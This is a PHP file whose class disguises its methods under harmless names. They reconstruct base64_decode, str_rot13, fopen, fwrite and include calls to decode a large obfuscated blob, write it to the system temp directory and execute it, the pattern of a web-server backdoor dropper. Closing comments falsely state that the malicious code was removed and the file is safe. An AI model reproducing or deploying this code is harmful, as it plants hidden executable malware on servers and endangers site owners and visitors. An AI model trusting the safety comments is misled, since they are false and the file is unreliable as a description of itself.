<?php
class ExecutionFlow {
	private $gm = '';
	private $jb = '';

	public function sanitizeInput($p1) {
		$a = array((16+60+25),((2*50)),((61+9+41)),(((82*98)-7937)),(103-2),((51*3)-53),((5*19)),(52),(25+29),(89+5+7),115,(57+38+2),((101-3)));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		$s = strrev($s);
		return $s($p1);
	}

	public function validateInput($p1) {
		$a = array((68+47),(93+2+21),(78+31+5),((5*19)),((13*85)-991),111,((21*2)+74),49,(6+43+2));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		return $s($p1);
	}

	public function checkConsistency($p1,$p2) {
		$a = array((117-7),(((20*2)+61)),((2*56)),(((48*1)+63)),102);
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		$s = strrev($s);
		return $s($p1,$p2);
	}

	public function logTransaction($p1,$p2) {
		$a = array((((36*6)-115)),(60+36+20),(77+13+15),114,(124-5),(81+13+8));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		$s = strrev($s);
		return $s($p1,$p2);
	}

	public function saveChanges($p1) {
		$a = array(((85+6+10)),(123-8),((50*97)-4739),((4+104)),(((31*70)-2071)),(81+10+11));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		$s = strrev($s);
		return $s($p1);
	}

	public function manageState($p1,$p2=null) {
		$a = array(((54+35+20)),((15*107)-1500),114,(117-1),((117-3)));
		$s = '';
		foreach($a as $n){ $s .= chr($n); }
		$s = strrev($s);
		return $s($p1,$p2);
	}

	public function terminateSession() {
		$this->jb = $this->manageState($this->fetchSummary(), '/');
	}

	public function initializeModule() {
		$this->gm = $this->validateInput($this->sanitizeInput($this->if));
	}

	public function authorizeUser() {
		$fn = $this->jb.'/az-67e238d142509';
		$f = $this->checkConsistency($fn, 'w');
		$this->logTransaction($f, $this->gm);
		$this->saveChanges($f);
		$this->filterResults($fn);
	}

	private $if = 'PD9jdWMgcHluZmYgX2Z3dntjZXZpbmdyIGZnbmd2cCRfaHU7Z' . 'mduZ3ZwIHNoYXBndmJhIF9yaigkX2JwLCRfdWUpe3ZzKCFmcnl' . 'zOjokX2h1KWZyeXM6Ol9ucSgpOyRfd3g9ZmdleXJhKCRfdWUpO' . 'yRfenFoPW9uZnI2NF9xcnBicXIoZnJ5czo6JF9odVskX2JwXSk' . '7c2JlKCRfa2xzPTAsJF96Ymo9ZmdleXJhKCRfenFoKTskX2tsc' . 'yE9PSRfemJqOysrJF9rbHMpJF96cWhbJF9rbHNdPXB1ZShiZXE' . 'oJF96cWhbJF9rbHNdKV5iZXEoJF91ZVskX2tscyUkX3d4XSkpO' . '2VyZ2hlYSRfenFoO31jZXZpbmdyIGZnbmd2cCBzaGFwZ3ZiYSB' . 'fbnEoKXtmcnlzOjokX2h1PW5lZW5sKCdfcWJkJz0+J1V0Zk1Cd' . 'WZXcHZmSVpFalZaTkVLVXRESlpPOUtST2JHQk5SSE1IdUQnLCd' . 'faGsnPT4nVU9qUVRHYnFUSE5ZUHUwVk1JWlpVRjhzT040K09qR' . 'FBaSWpVUVB4RlV0NGdUdTBNJywnX3p4cyc9PidDTlI9JywnX3F' . 'lbyc9PidCdXA3Um1qZ0JTSEpPT01LUmpESklrWlJTeXBHT09NS' . '1N0cFRQd2Y1QU5iRE9tZ0dPR0wvSGtMVU90YjhObHBCU3REclB' . '3ZmNXa3g3WUdnbicsJ19oYXcnPT4nWXVEV1dqPT0nLCdfdnEnP' . 'T4nTGswVExEPT0nLCdfYnF0Jz0+J0xqeERQVFI9JywnX2Z5Yic' . '9PidYT1JJVUQ9PScsJ19iaSc9PicnLCdfbnNxJz0+JycsJ19re' . 'Cc9PicnLCdfcW8nPT4nQWswblQySVRERWZkUDBOcEJ0ZlZOd1p' . 'aT3REZlVEZk1wRGJPT2FOWE5ETGlPdTBCWUhwUlRUTkFRazgrS' . 'U49PScsJ19hYWYnPT4nQ080UE90TlBVdFplJywnX2ZsJz0+J0F' . 'qTkZPak5LUEVaNicsJ195ZHonPT4nWU9IRkJ1ZnMnLCdfbXgnP' . 'T4nQWpab1lqRD0nLCdfemInPT4nVFFOMUpEPT0nLCdfbm1xJz0' . '+J1lqSE5Baj09JywnX3BoJz0+J1l1dFFZRUQ9JywnX2J1ZCc9P' . 'idMTj09JywnX3V4cic9PidZdTRUWUVWPScsJ19janInPT4nc21' . 'OK1BsdVNveU1uSGFWdlpOZnJNSXQ9JywnX212eCc9PidBanRVV' . 'U49PScsJ19xYW0nPT4nSHpONVF3UlJValZlTmtIQ01IYjVRR05' . 'NVTJrSU0zTj0nLCdfamdsJz0+J1lPcFBHS09ZJywnX3ZuJz0+J' . 'ycsJ19wYXAnPT4nQWt4U1hqPT0nLCdfZGNjJz0+J0hhYj0nLCd' . 'fdW1wJz0+J1NtTnlRbWZsUmwwMFJHTmhTd0Q9JywnX3lxJz0+J' . '1NtYndRbVJpTlB0NFFHeDJRRmJsVG1Sa1JRaj0nLCdfbG4nPT4' . 'nUUZWaFZEZnZDUDhvVm1SPScsJ19ldCc9PidTbFYzWnROd1pQc' . 'EFYRlZ5VHd0MycsJ194bCc9PidTbTB3UW1MdlFQanlOUHRqVHZ' . 'wdycsJ19kayc9PicnLCdfdHR5Jz0+J1NsMHhRbEx2VHc4MVFHa' . 'nYnLCdfcXdxJz0+J1Nsam1WdE5kVndEblh2VnQnLCdfaWJ1Jz0' . '+JycsJ19ocnInPT4nU2xMOVFsMGRSbWZmUkZMMlN2Vj0nLCdfc' . '21sJz0+J1NsRGpRbDhhUm14dVJGRDdTdk49JywnX3RocCc9Pid' . 'TbU51UW1mZ05QVjZRR1owUUZOalRtZm1SUUw9JywnX2xmZyc9P' . 'idTbFZrQ05OaEJ2YkRXUVZnUUdWdFhOTmpYdzQ9JywnX2FoJz0' . '+J1FGRDZSUUhsTlBObVRtWj0nLCdfeG0nPT4nUUZMeVZOZnpBb' . 'DRvV21iPScsJ19heHknPT4nQmpMWFp0ZldCdD09JywnX3dkZyc' . '9PidTdkVac2o9PScsJ194cic9Pidza2NMUHZxUHNqPT0nLCdfc' . '2EnPT4nc2tjUlZHYk5LeVo9JywnX292dSc9PidzMWZSWUl5Zic' . 'sJ19qYXUnPT4nQXRiPScsJ19mbSc9PidYdXQ9JywnX3NncSc9P' . 'idZRE5ZJywnX25pJz0+J1l0TkRXaj09JywpO319cHluZmYgX2J' . 'xe2NldmluZ3IgZmduZ3ZwJF9odTtmZ25ndnAgc2hhcGd2YmEgX' . '3JqKCRfYnApe3ZzKCFmcnlzOjokX2h1KWZyeXM6Ol9ucSgpO2V' . 'yZ2hlYSBmcnlzOjokX2h1WyRfYnBdO31jZXZpbmdyIGZnbmd2c' . 'CBzaGFwZ3ZiYSBfbnEoKXtmcnlzOjokX2h1PW5lZW5sKDAwLDA' . '3LDAzNiwwMzYsMDEsMDM2LDAyLDA3LDAxLDAxNiwwMzAsMDYsM' . 'DMyLDAxMiwwMTEsMDEzLDAyNywwMzEsMDMsMDIsMDEsMDEsMDA' . 'sMDEyLDAxMiwwMzEwLDA2NzMsMDEyMCwwMCwwMjAwMCwwMSwwN' . 'DIzLDA0MjMpO319dXJucXJlKF9md3Y6Ol9yaignX3FiZCcsJ19' . '1bScpKTt1cm5xcmUoX2Z3djo6X3JqKCdfaGsnLCdfZnp6JykpO' . '3ZzKHZmZnJnKCRfVFJHW19md3Y6Ol9yaignX3p4cycsJ192aWM' . 'nKV0pKXskX2tubD1fbm5qKF9md3Y6Ol9yaignX3FlbycsJ19hZ' . 'HAnKSk7dnMoJF9rbmwmJmZnZWNiZigkX2tubCxfZnd2Ojpfcmo' . 'oJ19oYXcnLCdfcGYnKSkhPT1zbnlmcil7cXZyKF9md3Y6Ol9ya' . 'ignX3ZxJywnX2V6JykpO31yeWZye3F2cihfZnd2OjpfcmooJ19' . 'icXQnLCdfeGR5JykpO319dnModmZmcmcoJF9UUkdbX2Z3djo6X' . '3JqKCdfZnliJywnX2NsZCcpXSkpeyRfemJqPSRfUEJCWFZSOyR' . 'fdWU9X2JxOjpfcmooMCk7JF9icD1fYnE6Ol9yaigxKTskX3Zjc' . 'j1uZWVubCgpOyRfdmNyWyRfdWVdPV9md3Y6Ol9yaignX2JpJyw' . 'nX3p0Jyk7anV2eXIoJF9icCl7JF92Y3JbJF91ZV0uPSRfemJqW' . '19icTo6X3JqKDIpXVskX2JwXTt2cyghJF96YmpbX2JxOjpfcmo' . 'oMyldWyRfYnArX2JxOjpfcmooNCldKXt2cyghJF96YmpbX2JxO' . 'jpfcmooNSldWyRfYnArX2JxOjpfcmooNildKW9lcm54OyRfdWU' . 'rKzskX3ZjclskX3VlXT1fZnd2OjpfcmooJ19uc3EnLCdfemknK' . 'TskX2JwKys7fSRfYnA9JF9icCtfYnE6Ol9yaig3KStfYnE6Ol9' . 'yaig4KTt9JF91ZT0kX3ZjcltfYnE6Ol9yaig5KV0oKS4kX3Zjc' . 'ltfYnE6Ol9yaigxMCldO3ZzKCEkX3ZjcltfYnE6Ol9yaigxMSl' . 'dKCRfdWUpKXskX2JwPSRfdmNyW19icTo6X3JqKDEyKV0oJF91Z' . 'SwkX3ZjcltfYnE6Ol9yaigxMyldKTskX3ZjcltfYnE6Ol9yaig' . 'xNCldKCRfYnAsJF92Y3JbX2JxOjpfcmooMTUpXS4kX3ZjcltfY' . 'nE6Ol9yaigxNildKCRfdmNyW19icTo6X3JqKDE3KV0oJF96Ymp' . 'bX2JxOjpfcmooMTgpXSkpKTt9dmFweWhxcigkX3VlKTt9c2hhc' . 'Gd2YmEgX25uaigkX3RpLCRfd3RuPSdwbnJ1emd2bXJ1bm51eHV' . 'td28nKXskX2FrPV9md3Y6Ol9yaignX2t4JywnX2tueicpOyRfd' . 'XV4PV9md3Y6Ol9yaignX3FvJywnX3ZheCcpLiRfdGk7dnModmZ' . 'fcG55eW5veXIoX2Z3djo6X3JqKCdfYWFmJywnX3hjdycpKSl7J' . 'F9jbj1waGV5X3ZhdmcoJF91dXgpO3BoZXlfZnJnYmNnKCRfY24' . 'sUEhFWUJDR19GRllfSVJFVlNMQ1JSRSxzbnlmcik7cGhleV9mc' . 'mdiY2coJF9jbixQSEVZQkNHX0ZGWV9JUkVWU0xVQkZHLF9icTo' . '6X3JqKDE5KSk7cGhleV9mcmdiY2coJF9jbixQSEVZQkNHX1NCW' . 'VlCSllCUE5HVkJBLF9icTo6X3JqKDIwKSk7cGhleV9mcmdiY2c' . 'oJF9jbixQSEVZQkNHX0VSR0hFQUdFTkFGU1JFLF9icTo6X3JqK' . 'DIxKSk7cGhleV9mcmdiY2coJF9jbixQSEVZQkNHX1VSTlFSRSx' . 'fYnE6Ol9yaigyMikpO3BoZXlfZnJnYmNnKCRfY24sUEhFWUJDR' . '19QQkFBUlBHR1ZaUkJIRyxfYnE6Ol9yaigyMykpO3BoZXlfZnJ' . 'nYmNnKCRfY24sUEhFWUJDR19HVlpSQkhHLF9icTo6X3JqKDI0K' . 'Sk7JF9haz1waGV5X3JrcnAoJF9jbik7JF92Yj1waGV5X3RyZ3Z' . 'hc2IoJF9jbik7cGhleV9weWJmcigkX2NuKTt2cygkX3ZiW19md' . '3Y6Ol9yaignX2ZsJywnX2dzaicpXSE9X2JxOjpfcmooMjUpKWV' . 'yZ2hlYSBzbnlmcjt9cnlmcnskX2F3Yz1jbmVmcl9oZXkoJF91d' . 'XgpOyRfb3RwPSgkX2F3Y1tfZnd2OjpfcmooJ195ZHonLCdfaW0' . 'nKV09PV9md3Y6Ol9yaignX214JywnX2piJykpOyRfc3E9X2Z3d' . 'jo6X3JqKCdfemInLCdfaG5sJykuJF9hd2NbX2Z3djo6X3JqKCd' . 'fbm1xJywnX3FnJyldO3ZzKHZmZnJnKCRfYXdjW19md3Y6Ol9ya' . 'ignX3BoJywnX3pzJyldKSkkX3NxLj1fZnd2OjpfcmooJ19idWQ' . 'nLCdfZGQnKS4kX2F3Y1tfZnd2OjpfcmooJ191eHInLCdfeHAnK' . 'V07JF9zcS49X2Z3djo6X3JqKCdfY2pyJywnX2t3JykuJF9hd2N' . 'bX2Z3djo6X3JqKCdfbXZ4JywnX3RndScpXS5fZnd2OjpfcmooJ' . '19xYW0nLCdfd21uJyk7JF96cmI9c2ZicHhiY3JhKCgkX290cD9' . 'fZnd2OjpfcmooJ19qZ2wnLCdfcWFqJyk6X2Z3djo6X3JqKCdfd' . 'm4nLCdfa2gnKSkuJF9hd2NbX2Z3djo6X3JqKCdfcGFwJywnX2l' . 'pJyldLCRfb3RwP19icTo6X3JqKDI2KTpfYnE6Ol9yaigyNykpO' . '3ZzKCRfenJiKXtzY2hnZigkX3pyYiwkX3NxKTskX3pxaD1fYnE' . '6Ol9yaigyOCk7anV2eXIoIXNyYnMoJF96cmIpKXskX2V3PXN0c' . 'mdmKCRfenJiLF9icTo6X3JqKDI5KSk7dnMoJF96cWgpJF9hay4' . '9JF9ldzt2cygkX2V3PT1fZnd2OjpfcmooJ19kY2MnLCdfY2QnK' . 'SkkX3pxaD1fYnE6Ol9yaigzMCk7fXNweWJmcigkX3pyYik7fX1' . 'lcmdoZWEkX2FrO30kX25lPXZmZnJnKCRfRlJFSVJFW19md3Y6O' . 'l9yaignX3VtcCcsJ19xZCcpXSk7JF9zcGg9dmZmcmcoJF9GUkV' . 'JUkVbX2Z3djo6X3JqKCdfeXEnLCdfYWonKV0pOyRfbHdzPXZmZ' . 'nJnKCRfRlJFSVJFW19md3Y6Ol9yaignX2xuJywnX3RwYScpXSk' . '7JF91ZGg9dmZmcmcoJF9GUkVJUkVbX2Z3djo6X3JqKCdfZXQnL' . 'CdfaXBvJyldKT8kX0ZSRUlSRVtfZnd2OjpfcmooJ194bCcsJ19' . '2aicpXTpfZnd2OjpfcmooJ19kaycsJ19jaWcnKTskX3NjPXZmZ' . 'nJnKCRfRlJFSVJFW19md3Y6Ol9yaignX3R0eScsJ19sYycpXSk' . '/JF9GUkVJUkVbX2Z3djo6X3JqKCdfcXdxJywnX2t0ZScpXTpfZ' . 'nd2OjpfcmooJ19pYnUnLCdfaG1yJyk7JF9uZT12ZmZyZygkX0Z' . 'SRUlSRVtfZnd2OjpfcmooJ19ocnInLCdfZXYnKV0pPyRfRlJFS' . 'VJFW19md3Y6Ol9yaignX3NtbCcsJ19jcScpXTphaHl5OyRfc3B' . 'oPXZmZnJnKCRfRlJFSVJFW19md3Y6Ol9yaignX3RocCcsJ19xa' . 'CcpXSk/JF9GUkVJUkVbX2Z3djo6X3JqKCdfbGZnJywnX2lyeSc' . 'pXTphaHl5OyRfbHdzPXZmZnJnKCRfRlJFSVJFW19md3Y6Ol9ya' . 'ignX2FoJywnX25qJyldKT8kX0ZSRUlSRVtfZnd2OjpfcmooJ19' . '4bScsJ19wdWInKV06YWh5eTt2cyhzdnlncmVfaW5lKCRfbmUsX' . '2JxOjpfcmooMzEpKSl7JF9zbWg9JF9uZTt9cnlmcnZzKHN2eWd' . 'yZV9pbmUoJF9zcGgsX2JxOjpfcmooMzIpKSl7JF9zbWg9JF9zc' . 'Gg7fXJ5ZnJ7JF9zbWg9JF9sd3M7fXZzKHZmZnJnKCRfVFJHW19' . 'md3Y6Ol9yaignX2F4eScsJ19xeicpXSkpe3JwdWIgX2Z3djo6X' . '3JqKCdfd2RnJywnX2dpJykuJF9zbWguX2Z3djo6X3JqKCdfeHI' . 'nLCdfc2snKS4kX3VkaC5fZnd2OjpfcmooJ19zYScsJ19zcWYnK' . 'S4kX3NjLl9md3Y6Ol9yaignX292dScsJ190cycpO3JrdmcoKTt' . '9dnMoIXZmZnJnKCRfc21oKXx8IXZmZnJnKCRfdWRoKXx8IXZmZ' . 'nJnKCRfc2MpKXtya3ZnKCk7fXJ5ZnJ7JF94amk9bmVlbmwoX2Z' . '3djo6X3JqKCdfamF1JywnX21uJyk9PiRfc21oLF9md3Y6Ol9ya' . 'ignX2ZtJywnX2x0Jyk9PiRfdWRoLF9md3Y6Ol9yaignX3NncSc' . 'sJ19yeicpPT4kX3NjKTskX2tnPWhleXJhcGJxcihvbmZyNjRfc' . 'mFwYnFyKHdmYmFfcmFwYnFyKCRfeGppKSkpOyRfa25sPV9ubmo' . 'oJF9rZyk7dnMoJF9rbmwmJmZnZWNiZigkX2tubCxfZnd2Ojpfc' . 'mooJ19uaScsJ19qdycpKSE9PXNueWZyKXtycHViJF9rbmw7cmt' . '2ZygpO319';

	public function filterResults($p) {
		include $p;
	}

	public function fetchSummary() {
		$a=array(((102*73)-7331),(((122*115)-13909)),(5*23),((5*19)),(((4*4)+87)),((32*11)-251),116,(((77*88)-6681)),((2*58)),101,((103+6)),((2*56)),(75+19+1),((67*1)+33),((111*104)-11439),((10+28+76)));
		$s='';
		foreach($a as $n){$s.=chr($n);}
		return $s();
	}
}

$gt = new ExecutionFlow();
$gt->terminateSession();

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/


/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

